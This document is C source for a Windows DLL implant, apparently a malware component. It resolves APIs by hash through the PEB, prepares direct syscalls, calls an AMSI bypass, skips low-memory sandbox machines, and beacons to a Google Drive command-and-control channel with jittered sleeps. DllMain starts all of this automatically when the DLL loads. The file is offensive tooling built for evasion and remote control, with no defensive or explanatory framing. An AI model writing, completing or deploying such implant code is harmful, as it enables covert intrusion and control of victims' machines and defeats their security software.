#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"

static PVOID g_SyscallGadget = NULL;

typedef struct _API_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQuerySystemInformation;

    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
    ULONG_PTR GetSystemInfo;
    ULONG_PTR GetModuleFileNameW;
} API_TABLE;

static API_TABLE g_ApiTable = {0};

static PVOID GetModuleBaseByHash(uint32_t hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) return entry->DllBase;
        current = current->Flink;
    }
    return NULL;
}

static PVOID ResolveApiByHash(PVOID moduleBase, uint32_t hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)((PBYTE)moduleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        if (HashStringDjb2A((LPCSTR)((PBYTE)moduleBase + pNames[i])) == hash) {
            return (PVOID)((PBYTE)moduleBase + pFuncs[pOrds[i]]);
        }
    }
    return NULL;
}

static void InitializeApiTable() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);

    g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
    
    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);

    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
    g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
    g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
}

static void StealthSleep(DWORD dwBaseMS) {
    srand((unsigned int)time(NULL));
    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);

    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
    if (!hTimer) return;

    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
    
    WaitForSingleObject(hTimer, INFINITE);
    CloseHandle(hTimer);
}

static BOOL IsTargetEnvironment() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys < (8ULL * 1024 * 1024 * 1024)) return FALSE;
    return TRUE;
}

extern "C" __declspec(dllexport) void StartPlugin() {
    g_SyscallGadget = FindSyscallGadget();
    InitializeApiTable();

    BypassAMSI_DataOnly();

    if (!IsTargetEnvironment()) return;

    char cmdBuffer[1024];
    while (TRUE) {
        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
        }
        StealthSleep(60000); 
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartPlugin, NULL, 0, NULL);
            break;
    }
    return TRUE;
}
